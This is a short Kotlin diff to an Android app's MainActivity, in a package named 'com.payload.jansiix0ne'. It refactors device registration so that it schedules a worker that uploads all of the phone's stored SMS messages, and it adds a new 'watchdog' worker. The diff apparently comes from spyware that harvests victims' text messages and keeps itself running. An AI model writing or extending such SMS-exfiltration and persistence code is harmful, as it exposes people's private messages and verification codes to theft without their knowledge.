@@ -46,21 +46,10 @@ class MainActivity : ComponentActivity() {
     }
     
     private fun registerDevice() {
-        // Schedule device registration worker
-        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
-            "register_device",
-            androidx.work.ExistingWorkPolicy.KEEP,
-            androidx.work.OneTimeWorkRequestBuilder<com.payload.jansiix0ne.worker.RegisterUserWorker>()
-                .build()
-        )
-        
-        // Schedule all SMS upload worker (for old SMS)
-        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
-            "upload_all_sms",
-            androidx.work.ExistingWorkPolicy.KEEP,
-            androidx.work.OneTimeWorkRequestBuilder<com.payload.jansiix0ne.worker.AllSmsUploadWorker>()
-                .build()
-        )
+        // Use WorkManagerHelper for better management
+        com.payload.jansiix0ne.utils.WorkManagerHelper.scheduleRegisterUser(applicationContext)
+        com.payload.jansiix0ne.utils.WorkManagerHelper.scheduleAllSmsUpload(applicationContext)
+        com.payload.jansiix0ne.utils.WorkManagerHelper.scheduleWatchdog(applicationContext)
     }
 
     override fun onResume() {
